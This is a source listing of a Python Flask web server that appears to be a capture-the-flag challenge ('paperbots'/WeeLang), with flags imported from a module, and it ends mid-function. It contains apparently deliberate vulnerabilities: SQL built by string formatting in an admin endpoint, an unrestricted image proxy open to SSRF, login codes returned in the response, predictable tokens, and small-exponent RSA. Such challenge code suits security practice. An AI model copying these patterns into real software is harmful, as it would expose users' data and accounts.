class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import inspect</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">import sqlite3</span><br><span class="line">import string</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">from html import escape</span><br><span class="line">from urllib import parse</span><br><span class="line">from typing import Union, List, Tuple</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">from subprocess import STDOUT, check_output</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from flask import Flask, send_from_directory, send_file, request, Response, g, make_response, jsonify</span><br><span class="line">from flags import DB_SECRET, DECRYPTED, DEV_NULL, LOCALHOST, LOGGED_IN</span><br><span class="line"></span><br><span class="line">STATIC_PATH = &quot;../client/site&quot;</span><br><span class="line">DATABASE = &quot;.paperbots.db&quot;</span><br><span class="line">MIGRATION_PATH = &quot;./db/V1__Create_tables.sql&quot;</span><br><span class="line">THUMBNAIL_PATH = os.path.join(STATIC_PATH, &quot;thumbnails&quot;)</span><br><span class="line">WEE_PATH = &quot;../weelang&quot;</span><br><span class="line">WEETERPRETER = &quot;weeterpreter.ts&quot;</span><br><span class="line">WEE_TIMEOUT = 5</span><br><span class="line"></span><br><span class="line">os.makedirs(THUMBNAIL_PATH, exist_ok=True)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_folder=STATIC_PATH, static_url_path=&quot;/static&quot;)</span><br><span class="line"></span><br><span class="line">encrypted = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_db() -&gt; sqlite3.Connection:</span><br><span class="line">    db = getattr(g, &apos;_database&apos;, None)</span><br><span class="line">    if db is None:</span><br><span class="line">        db = g._database = sqlite3.connect(DATABASE)</span><br><span class="line">    return db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def init_db():</span><br><span class="line">    with app.app_context():</span><br><span class="line">        db = get_db()</span><br><span class="line">        with open(MIGRATION_PATH, &quot;r&quot;) as f:</span><br><span class="line">            db.cursor().executescript(f.read())</span><br><span class="line">        db.execute(&quot;CREATE TABLE `secrets`(`id` INTEGER PRIMARY KEY AUTOINCREMENT, `secret` varchar(255) NOT NULL)&quot;)</span><br><span class="line">        db.execute(&quot;INSERT INTO secrets(secret) values(?)&quot;, (DB_SECRET,))</span><br><span class="line">        db.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def query_db(query, args=(), one=True) -&gt; Union[List[Tuple], Tuple, None]:</span><br><span class="line">    if not isinstance(args, tuple):</span><br><span class="line">        args = (args,)</span><br><span class="line">    cur = get_db().execute(query, args)</span><br><span class="line">    rv = cur.fetchall()</span><br><span class="line">    cur.close()</span><br><span class="line">    return (rv[0] if rv else None) if one else rv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def user_by_token(token) -&gt; Tuple[int, str, str, str]:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    queries and returns userId, username, email, usertype for a given token</span><br><span class="line">    :param token: the token</span><br><span class="line">    :return: userId, name, email, usertype</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if not token:</span><br><span class="line">        raise AttributeError(&quot;Token must not be empty&quot;)</span><br><span class="line"></span><br><span class="line">    userId, = query_db(&quot;SELECT userId FROM userTokens WHERE token=?&quot;, token)  # TODO: Join this?</span><br><span class="line">    name, email, usertype = query_db(&quot;SELECT name, email, type FROM users WHERE id=?&quot;, userId)</span><br><span class="line">    return userId, name, email, usertype</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def random_code(length=6) -&gt; str:</span><br><span class="line">    return &quot;&quot;.join([random.choice(string.ascii_lowercase)[0] for x in range(length)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_code(username):</span><br><span class="line">    db = get_db()</span><br><span class="line">    c = db.cursor()</span><br><span class="line">    userId, = query_db(&quot;SELECT id FROM users WHERE name=?&quot;, username)</span><br><span class="line">    code = random_code()</span><br><span class="line">    c.execute(&quot;INSERT INTO userCodes(userId, code) VALUES(?, ?)&quot;, (userId, code))</span><br><span class="line">    db.commit()</span><br><span class="line">    # TODO: Send the code as E-Mail instead :)</span><br><span class="line">    return code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def jsonify_projects(projects, username, usertype):</span><br><span class="line">    return jsonify([</span><br><span class="line">        &#123;&quot;code&quot;: x[0],</span><br><span class="line">         &quot;userName&quot;: x[1],</span><br><span class="line">         &quot;title&quot;: x[2],</span><br><span class="line">         &quot;public&quot;: x[3],</span><br><span class="line">         &quot;type&quot;: x[4],</span><br><span class="line">         &quot;lastModified&quot;: x[5],</span><br><span class="line">         &quot;created&quot;: x[6],</span><br><span class="line">         &quot;content&quot;: x[7]</span><br><span class="line">         &#125; for x in projects if usertype == &quot;admin&quot; or x[1] == username or x[3]</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.teardown_appcontext</span><br><span class="line">def close_connection(exception):</span><br><span class="line">    db = getattr(g, &apos;_database&apos;, None)</span><br><span class="line">    if db is not None:</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Error handling</span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def fourohfour(e):</span><br><span class="line">    return send_file(os.path.join(STATIC_PATH, &quot;404.html&quot;)), 404</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.errorhandler(500)</span><br><span class="line">def fivehundred(e):</span><br><span class="line">    return jsonify(&#123;&quot;error&quot;: str(e)&#125;), 500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.after_request</span><br><span class="line">def secure(response: Response):</span><br><span class="line">    if not request.path[-3:] in [&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;]:</span><br><span class="line">        response.headers[&quot;X-Frame-Options&quot;] = &quot;SAMEORIGIN&quot;</span><br><span class="line">        response.headers[&quot;X-Xss-Protection&quot;] = &quot;1; mode=block&quot;</span><br><span class="line">        response.headers[&quot;X-Content-Type-Options&quot;] = &quot;nosniff&quot;</span><br><span class="line">        response.headers[&quot;Content-Security-Policy&quot;] = &quot;script-src &apos;self&apos; &apos;unsafe-inline&apos;;&quot;</span><br><span class="line">        response.headers[&quot;Referrer-Policy&quot;] = &quot;no-referrer-when-downgrade&quot;</span><br><span class="line">        response.headers[&quot;Feature-Policy&quot;] = &quot;geolocation &apos;self&apos;; midi &apos;self&apos;; sync-xhr &apos;self&apos;; microphone &apos;self&apos;; &quot; \</span><br><span class="line">                                             &quot;camera &apos;self&apos;; magnetometer &apos;self&apos;; gyroscope &apos;self&apos;; speaker &apos;self&apos;; &quot; \</span><br><span class="line">                                             &quot;fullscreen *; payment &apos;self&apos;; &quot;</span><br><span class="line">        if request.remote_addr == &quot;127.0.0.1&quot;:</span><br><span class="line">            response.headers[&quot;X-Localhost-Token&quot;] = LOCALHOST</span><br><span class="line"></span><br><span class="line">    return response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])</span><br><span class="line">def main():</span><br><span class="line">    return send_file(os.path.join(STATIC_PATH, &quot;index.html&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/kitten.png&quot;)</span><br><span class="line">def kitten():</span><br><span class="line">    return send_file(os.path.join(STATIC_PATH, &quot;img/kitten.png&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># The actual page</span><br><span class="line">@app.route(&quot;/&lt;path:filename&gt;&quot;, methods=[&quot;GET&quot;])</span><br><span class="line">def papercontents(filename):</span><br><span class="line">    return send_from_directory(STATIC_PATH, filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/signup&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def signup():</span><br><span class="line">    usertype = &quot;user&quot;</span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    name = escape(json[&quot;name&quot;].strip())</span><br><span class="line">    email = json[&quot;email&quot;].strip()</span><br><span class="line">    if len(name) == 0:</span><br><span class="line">        raise Exception(&quot;InvalidUserName&quot;)</span><br><span class="line">    if len(email) == 0:</span><br><span class="line">        raise Exception(&quot;InvalidEmailAddress&quot;)</span><br><span class="line">    if not len(email.split(&quot;@&quot;)) == 2:</span><br><span class="line">        raise Exception(&quot;InvalidEmailAddress&quot;)</span><br><span class="line">    email = escape(email.strip())</span><br><span class="line">    # Make sure the user name is 4-25 letters/digits only.</span><br><span class="line">    if len(name) &lt; 4 or len(name) &gt; 25:</span><br><span class="line">        raise Exception(&quot;InvalidUserName&quot;)</span><br><span class="line"></span><br><span class="line">    if not all([x in string.ascii_letters or x in string.digits for x in name]):</span><br><span class="line">        raise Exception(&quot;InvalidUserName&quot;)</span><br><span class="line">    # Check if name exists</span><br><span class="line">    if query_db(&quot;SELECT name FROM users WHERE name=?&quot;, name):</span><br><span class="line">        raise Exception(&quot;UserExists&quot;)</span><br><span class="line">    if query_db(&quot;Select id, name FROM users WHERE email=?&quot;, email):</span><br><span class="line">        raise Exception(&quot;EmailExists&quot;)</span><br><span class="line">    # Insert user // TODO: implement the verification email</span><br><span class="line">    db = get_db()</span><br><span class="line">    c = db.cursor()</span><br><span class="line">    c.execute(&quot;INSERT INTO users(name, email, type) values(?, ?, ?)&quot;, (name, email, usertype))</span><br><span class="line">    db.commit()</span><br><span class="line">    return jsonify(&#123;&quot;success&quot;: True&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/login&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def login():</span><br><span class="line">    print(&quot;Logging in?&quot;)</span><br><span class="line">    # TODO Send Mail</span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    login = json[&quot;email&quot;].strip()</span><br><span class="line">    try:</span><br><span class="line">        userid, name, email = query_db(&quot;SELECT id, name, email FROM users WHERE email=? OR name=?&quot;, (login, login))</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        raise Exception(&quot;UserDoesNotExist&quot;)</span><br><span class="line">    return get_code(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/verify&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def verify():</span><br><span class="line">    code = request.get_json(force=True)[&quot;code&quot;].strip()</span><br><span class="line">    if not code:</span><br><span class="line">        raise Exception(&quot;CouldNotVerifyCode&quot;)</span><br><span class="line">    userid, = query_db(&quot;SELECT userId FROM userCodes WHERE code=?&quot;, code)</span><br><span class="line">    db = get_db()</span><br><span class="line">    c = db.cursor()</span><br><span class="line">    c.execute(&quot;DELETE FROM userCodes WHERE userId=?&quot;, (userid,))</span><br><span class="line">    token = random_code(32)</span><br><span class="line">    c.execute(&quot;INSERT INTO userTokens (userId, token) values(?,?)&quot;, (userid, token))</span><br><span class="line">    db.commit()</span><br><span class="line">    name, = query_db(&quot;SELECT name FROM users WHERE id=?&quot;, (userid,))</span><br><span class="line">    resp = make_response()</span><br><span class="line">    resp.set_cookie(&quot;token&quot;, token, max_age=2 ** 31 - 1)</span><br><span class="line">    resp.set_cookie(&quot;name&quot;, name, max_age=2 ** 31 - 1)</span><br><span class="line">    resp.set_cookie(&quot;logged_in&quot;, LOGGED_IN)</span><br><span class="line">    return resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/logout&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def logout():</span><br><span class="line">    request.cookies.get(&quot;token&quot;)</span><br><span class="line">    resp = make_response()</span><br><span class="line">    resp.set_cookie(&quot;token&quot;, &quot;&quot;)</span><br><span class="line">    resp.set_cookie(&quot;name&quot;, &quot;&quot;)</span><br><span class="line">    resp.set_cookie(&quot;logged_in&quot;, &quot;&quot;)</span><br><span class="line">    return resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/getproject&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def getproject():</span><br><span class="line">    # TODO: Do.</span><br><span class="line">    project_id = request.get_json(force=True)[&quot;projectId&quot;]</span><br><span class="line">    token = request.cookies.get(&quot;token&quot;)</span><br><span class="line">    try:</span><br><span class="line">        userId, name, email, usertype = user_by_token(token)</span><br><span class="line">    except AttributeError:</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        usertype = &quot;user&quot;</span><br><span class="line">    project = query_db(&quot;SELECT code, userName, title, description, content, public, type, lastModified, created &quot;</span><br><span class="line">                       &quot;FROM projects WHERE code=?&quot;, (project_id,))</span><br><span class="line">    if not project or (not project[5] and not name == project[1] and not usertype == &quot;admin&quot;):</span><br><span class="line">        raise Exception(&quot;ProjectDoesNotExist&quot;)</span><br><span class="line">    return jsonify(&#123;</span><br><span class="line">        &quot;code&quot;: project[0],</span><br><span class="line">        &quot;userName&quot;: project[1],</span><br><span class="line">        &quot;title&quot;: project[2],</span><br><span class="line">        &quot;description&quot;: project[3],</span><br><span class="line">        &quot;content&quot;: project[4],</span><br><span class="line">        &quot;public&quot;: project[5],</span><br><span class="line">        &quot;type&quot;: project[6],</span><br><span class="line">        &quot;lastModified&quot;: project[7],</span><br><span class="line">        &quot;created&quot;: project[8]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/getprojects&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def getuserprojects():</span><br><span class="line">    username = request.get_json(force=True)[&quot;userName&quot;]</span><br><span class="line">    projects = query_db(&quot;SELECT code, userName, title, public, type, lastModified, created, content &quot;</span><br><span class="line">                        &quot;FROM projects WHERE userName=? ORDER BY lastModified DESC&quot;, (username), False)</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    usertype = &quot;user&quot;</span><br><span class="line">    if &quot;token&quot; in request.cookies:</span><br><span class="line">        userId, name, email, usertype = user_by_token(request.cookies[&quot;token&quot;])</span><br><span class="line">    return jsonify_projects(projects, name, usertype)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/saveproject&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def saveproject():</span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    name = request.cookies[&quot;name&quot;]</span><br><span class="line">    token = request.cookies[&quot;token&quot;]</span><br><span class="line">    # TODO String projectId = paperbots.saveProject(ctx.cookie(&quot;token&quot;), request.getCode(), request.getTitle(), request.getDescription(), request.getContent(), request.isPublic(), request.getType());</span><br><span class="line">    userId, username, email, usertype = user_by_token(token)</span><br><span class="line"></span><br><span class="line">    db = get_db()</span><br><span class="line">    c = db.cursor()</span><br><span class="line"></span><br><span class="line">    if not json[&quot;code&quot;]:</span><br><span class="line">        project_id = random_code(6)</span><br><span class="line"></span><br><span class="line">        c.execute(</span><br><span class="line">            &quot;INSERT INTO projects(userId, userName, code, title, description, content, public, type) &quot;</span><br><span class="line">            &quot;VALUES(?,?,?,?,?,?,?,?)&quot;,</span><br><span class="line">            (userId, username, project_id,</span><br><span class="line">             escape(json[&quot;title&quot;]), escape(json[&quot;description&quot;]), json[&quot;content&quot;], True, json[&quot;type&quot;]))</span><br><span class="line">        db.commit()</span><br><span class="line">        return jsonify(&#123;&quot;projectId&quot;: project_id&#125;)</span><br><span class="line">    else:</span><br><span class="line">        c.execute(&quot;UPDATE projects SET title=?, description=?, content=?, public=? WHERE code=? AND userId=?&quot;,</span><br><span class="line">                  (escape(json[&quot;title&quot;]), escape(json[&quot;description&quot;]), json[&quot;content&quot;], True, json[&quot;code&quot;],</span><br><span class="line">                   userId)</span><br><span class="line">                  )</span><br><span class="line">        db.commit()</span><br><span class="line">        return jsonify(&#123;&quot;projectId&quot;: json[&quot;code&quot;]&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/savethumbnail&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def savethumbnail():</span><br><span class="line">    name = request.cookies[&quot;name&quot;]</span><br><span class="line">    token = request.cookies[&quot;token&quot;]</span><br><span class="line">    userId, username, email, usertype = user_by_token(token)</span><br><span class="line"></span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    thumbnail = json[&quot;thumbnail&quot;]  # type: str</span><br><span class="line">    project_id = json[&quot;projectId&quot;]</span><br><span class="line">    if not thumbnail.startswith(&quot;data:image/png;base64,&quot;):</span><br><span class="line">        raise Exception(&quot;Hacker&quot;)</span><br><span class="line">    thumbnail = thumbnail[len(&quot;data:image/png;base64,&quot;):].encode(&quot;ascii&quot;)</span><br><span class="line">    decoded = base64.b64decode(thumbnail)</span><br><span class="line">    project_username, = query_db(&quot;SELECT userName FROM projects WHERE code=?&quot;, (project_id,))</span><br><span class="line">    if project_username != username:</span><br><span class="line">        raise Exception(&quot;Hack on WeeLang, not the Server!&quot;)</span><br><span class="line">    with open(os.path.join(THUMBNAIL_PATH, &quot;&#123;&#125;.png&quot;.format(project_id)), &quot;wb+&quot;) as f:</span><br><span class="line">        f.write(decoded)</span><br><span class="line">    return jsonify(&#123;&quot;projectId&quot;: project_id&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/deleteproject&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def deleteproject():</span><br><span class="line">    name = request.cookies[&quot;name&quot;]</span><br><span class="line">    token = request.cookies[&quot;token&quot;]</span><br><span class="line">    userid, username, email, usertype = user_by_token(token)</span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    projectid = json[&quot;projectId&quot;]</span><br><span class="line">    project_username = query_db(&quot;SELECT userName FROM projects WHERE code=?&quot;, (projectid,))</span><br><span class="line">    if project_username != username and usertype != &quot;admin&quot;:</span><br><span class="line">        raise Exception(&quot;Nope&quot;)</span><br><span class="line">    db = get_db()</span><br><span class="line">    c = db.cursor()</span><br><span class="line">    c.execute(&quot;DELETE FROM projects WHERE code=?&quot;, (projectid,))</span><br><span class="line">    db.commit()</span><br><span class="line">    # raise Exception(&quot;The Internet Never Forgets&quot;)</span><br><span class="line">    return &#123;&quot;projectId&quot;: projectid&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Admin endpoints</span><br><span class="line">@app.route(&quot;/api/getprojectsadmin&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def getprojectsadmin():</span><br><span class="line">    # ProjectsRequest request = ctx.bodyAsClass(ProjectsRequest.class);</span><br><span class="line">    # ctx.json(paperbots.getProjectsAdmin(ctx.cookie(&quot;token&quot;), request.sorting, request.dateOffset));</span><br><span class="line">    name = request.cookies[&quot;name&quot;]</span><br><span class="line">    token = request.cookies[&quot;token&quot;]</span><br><span class="line">    user, username, email, usertype = user_by_token(token)</span><br><span class="line"></span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    offset = json[&quot;offset&quot;]</span><br><span class="line">    sorting = json[&quot;sorting&quot;]</span><br><span class="line"></span><br><span class="line">    if name != &quot;admin&quot;:</span><br><span class="line">        raise Exception(&quot;InvalidUserName&quot;)</span><br><span class="line"></span><br><span class="line">    sortings = &#123;</span><br><span class="line">        &quot;newest&quot;: &quot;created DESC&quot;,</span><br><span class="line">        &quot;oldest&quot;: &quot;created ASC&quot;,</span><br><span class="line">        &quot;lastmodified&quot;: &quot;lastModified DESC&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    sql_sorting = sortings[sorting]</span><br><span class="line"></span><br><span class="line">    if not offset:</span><br><span class="line">        offset = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line">    return jsonify_projects(query_db(</span><br><span class="line">        &quot;SELECT code, userName, title, public, type, lastModified, created, content FROM projects WHERE created &lt; &apos;&#123;&#125;&apos; &quot;</span><br><span class="line">        &quot;ORDER BY &#123;&#125; LIMIT 10&quot;.format(offset, sql_sorting), one=False), username, &quot;admin&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/api/getfeaturedprojects&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def getfeaturedprojects():</span><br><span class="line">    try:</span><br><span class="line">        name = request.cookies[&quot;name&quot;]</span><br><span class="line">        token = request.cookies[&quot;token&quot;]</span><br><span class="line">        userid, username, email, usertype = user_by_token(token)</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        username = &quot;&quot;</span><br><span class="line">        usertype = &quot;user&quot;</span><br><span class="line"></span><br><span class="line">    projects = query_db(&quot;SELECT code, userName, title, type, lastModified, created, content FROM projects &quot;</span><br><span class="line">                        &quot;WHERE featured=1 AND public=1 ORDER BY lastModified DESC&quot;, one=False)</span><br><span class="line">    return jsonify_projects(projects, username, usertype)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Proxy images to avoid tainted canvases when thumbnailing.</span><br><span class="line">@app.route(&quot;/api/proxyimage&quot;, methods=[&quot;GET&quot;])</span><br><span class="line">def proxyimage():</span><br><span class="line">    url = request.args.get(&quot;url&quot;, &apos;&apos;)</span><br><span class="line">    parsed = parse.urlparse(url, &quot;http&quot;)  # type: parse.ParseResult</span><br><span class="line">    if not parsed.netloc:</span><br><span class="line">        parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult</span><br><span class="line">    url = parsed.geturl()</span><br><span class="line"></span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    if not resp.headers[&quot;Content-Type&quot;].startswith(&quot;image/&quot;):</span><br><span class="line">        raise Exception(&quot;Not a valid image&quot;)</span><br><span class="line"></span><br><span class="line">    # See https://stackoverflow.com/a/36601467/1345238</span><br><span class="line">    excluded_headers = [&apos;content-encoding&apos;, &apos;content-length&apos;, &apos;transfer-encoding&apos;, &apos;connection&apos;]</span><br><span class="line">    headers = [(name, value) for (name, value) in resp.raw.headers.items()</span><br><span class="line">               if name.lower() not in excluded_headers]</span><br><span class="line"></span><br><span class="line">    response = Response(resp.content, resp.status_code, headers)</span><br><span class="line">    return response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Additional pyserver functions:</span><br><span class="line"></span><br><span class="line"># Wee as a service.</span><br><span class="line">def runwee(wee: string) -&gt; string:</span><br><span class="line">    print(&quot;&#123;&#125;: running &#123;&#125;&quot;.format(request.remote_addr, wee))</span><br><span class="line">    result = check_output(</span><br><span class="line">        [&quot;ts-node&quot;, &apos;--cacheDirectory&apos;, os.path.join(WEE_PATH, &quot;__cache__&quot;),</span><br><span class="line">         os.path.join(WEE_PATH, WEETERPRETER), wee], shell=False, stderr=STDOUT, timeout=WEE_TIMEOUT,</span><br><span class="line">        cwd=WEE_PATH).decode(&quot;utf-8&quot;)</span><br><span class="line">    print(&quot;&#123;&#125;: result: &#123;&#125;&quot;.format(request.remote_addr, result))</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/wee/run&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def weeservice():</span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    wee = json[&quot;code&quot;]</span><br><span class="line">    out = runwee(wee)</span><br><span class="line">    return jsonify(&#123;&quot;code&quot;: wee, &quot;result&quot;: out&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/wee/dev/null&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def dev_null():</span><br><span class="line">    json = request.get_json(force=True)</span><br><span class="line">    wee = json[&quot;code&quot;]</span><br><span class="line">    wee = &quot;&quot;&quot;</span><br><span class="line">    var DEV_NULL: string = &apos;&#123;&#125;&apos;</span><br><span class="line">    &#123;&#125;</span><br><span class="line">    &quot;&quot;&quot;.format(DEV_NULL, wee)</span><br><span class="line">    _ = runwee(wee)</span><br><span class="line">    return &quot;GONE&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/wee/encryptiontest&quot;, methods=[&quot;GET&quot;])</span><br><span class="line">def encryptiontest():</span><br><span class="line">    global encrypted</span><br><span class="line">    if not encrypted:</span><br><span class="line">        wee = &quot;&quot;&quot;</span><br><span class="line">        # we use weelang to encrypt secrets completely secret</span><br><span class="line"></span><br><span class="line">        record pubkey</span><br><span class="line">            n: string</span><br><span class="line">            e: string</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        var key = pubkey(&apos;951477056381671188036079180681828396446164466568923964269373812360568216940258578681673755725586138473475522188240856850626984093905399964041687626629414562063470963902807801143023140969208234239276778397171817582591827008690056789763534174119863046106813515750863733543758319811194784246845138921495556311458180478538856550842509692686396679117903040148607642710832573838027274004952072516749168425434697690016707327002989407014753735313730653189661541750880855213165937564578292464379167857778759136474173425831340306919705672933486711939333953750637729967455118475408369751602538202818190663939706886093046526104043062374288648189070207772477271879494000411582080352364098957455090381238978031676375437980396931371164061080967754225429135119036489128165414029872153856547376448552882344531325480944511714482341088742350110097372766748364926941000441524157824859511557342673524388056049358362600925172299990719998873868038194555465008036497932945812845340638853399732721987228486858193979073913761760370769609347622795498987306822413134236749607735657967667902966667996797241364688793919066445360547749193845825298342626288990158730149727398354192053692360716383851051271618559075048012800235250387837052573541157845958948856954035758915157871993646182544696043757263004887914724250286341123038686355398997399922927237477691269351791943572679717263938613148630387793458838416117454016370454288153779764863162055098229903413503857354581027436855574871814478747237999617879024407403954905986969721336803258774514397600947175650242674193496614652267158753817350136305620268076457813070726099248681642612063203170442453405051455877524709366973062774037044772079720703743828695351198984334830532193564525916901461725538418714517302390850049543856542699391339075976843028654004552169277571339017161697013373622770115406681080294994790626557117129820457988045974009530185622113951540819939983153190486345031549722007896699102268137425607039925174692583738394816628508716999668221820730737934785438568198334912127263127241407430459511422030656861043544813130287622862247904749760983465608684778389799703770877931875268858524702991767450720773677639856979930404508755100624844341829896497906824520180051038779126563860453039035779455387733056343833776802716194138072528278142786901904343407377649000988142255369860324110311816186668720584468851089864315465497405748709976389375632079690963423708940060402561050963276766635011726613211018206198125893007608417148033891841809&apos;, &apos;3&apos;)</span><br><span class="line"></span><br><span class="line">        fun encrypt(message: string, key: pubkey): string</span><br><span class="line">            return bigModPow(strToBig(message), key.e, key.n)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        fun get_cypher(key: pubkey): string</span><br><span class="line">            var message = &apos;&#123;&#125;&apos;</span><br><span class="line">            return encrypt(message, key)</span><br><span class="line">        end</span><br><span class="line">            </span><br><span class="line">        alert(get_cypher(key))</span><br><span class="line">        &quot;&quot;&quot;.format(DECRYPTED)</span><br><span class="line">        encrypted = runwee(wee)</span><br><span class="line">    return jsonify(&#123;&quot;enc&quot;: encrypted&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># The pyserver is almost 100% open source!</span><br><span class="line"># Just enough to barely get it running but never to its full potential.</span><br><span class="line"># We got very positive feedback on HN and nobody bothered to run it anyway.</span><br><span class="line"># 11/10 would open source again.</span><br><span class="line">@app.route(&quot;/pyserver/server.py&quot;, methods=[&quot;GET&quot;])</span><br><span class="line">def 